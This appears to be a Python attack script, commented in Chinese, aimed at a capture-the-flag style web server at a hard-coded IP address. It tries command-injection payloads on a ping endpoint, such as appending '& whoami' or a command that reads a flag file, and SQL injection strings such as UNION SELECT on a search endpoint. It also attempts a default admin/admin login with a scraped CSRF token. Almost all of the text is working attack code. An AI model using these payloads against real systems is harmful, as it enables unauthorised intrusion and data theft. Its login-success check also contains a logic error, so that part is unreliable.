import requests
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("检查Ping完整响应")
print("="*70)

# 测试正常Ping
print("\n正常Ping:")
r = session.get(f"{TARGET}/ping", params={"host": "127.0.0.1"}, timeout=15)
body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
if body:
    print(body.group(1))

# 测试带命令的Ping
print("\n" + "="*70)
print("测试Ping + 命令执行")
print("="*70)

payloads = [
    "127.0.0.1 & whoami",
    "127.0.0.1 && whoami",
    "127.0.0.1 | whoami",
    "127.0.0.1; whoami",
    "127.0.0.1 & type F:\\flag.txt",
    "127.0.0.1 && type F:\\flag.txt",
]

for payload in payloads:
    print(f"\n>>> Payload: {payload}")
    r = session.get(f"{TARGET}/ping", params={"host": payload}, timeout=15)
    body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    if body:
        content = body.group(1)
        print(f"完整响应:\n{content}")
        
        # 检查是否有flag
        flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
        if flag_match:
            print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
            exit(0)

print("\n" + "="*70)
print("检查SQL注入")
print("="*70)

sql_payloads = [
    "' OR 1=1--",
    "' UNION SELECT 1,2,flag FROM flags--",
    "' AND 1=1--",
    "' AND 1=2--",
]

for payload in sql_payloads:
    print(f"\n>>> SQL: {payload}")
    r = session.get(f"{TARGET}/search", params={"q": payload}, timeout=15)
    
    # 检查响应
    results = re.findall(r'<article[^>]*>.*?<h2>(.*?)</h2>.*?<p>(.*?)</p>.*?<small>(.*?)</small>', r.text, re.DOTALL)
    print(f"结果数: {len(results)}")
    for title, content, owner in results:
        print(f"  - {title.strip()}: {content.strip()} ({owner.strip()})")
    
    # 检查flag
    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    if flag_match:
        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
        exit(0)

print("\n" + "="*70)
print("检查登录后的控制台")
print("="*70)

# 获取CSRF
r = session.get(f"{TARGET}/login", timeout=15)
csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
csrf_token = csrf.group(1) if csrf else ""

print(f"CSRF Token: {csrf_token}")

# 尝试登录
login_data = {"username": "admin", "password": "admin", "csrf": csrf_token}
r = session.post(f"{TARGET}/login", data=login_data, timeout=15)

print(f"登录响应状态码: {r.status_code}")
print(f"响应内容长度: {len(r.text)}")

# 检查是否有重定向或成功标志
if "登录" not in r.text[:100] or "用户名或密码错误" not in r.text:
    print("可能登录成功!")
    print(f"响应内容: {r.text[:500]}")
    
    # 检查Cookies
    print(f"Cookies: {session.cookies.get_dict()}")
    
    # 尝试访问控制台
    r2 = session.get(f"{TARGET}/dashboard", timeout=15)
    print(f"\n控制台内容:")
    print(r2.text[:800])
    
    # 检查flag
    flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
    if flag_match:
        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
        exit(0)

print("\n测试完成")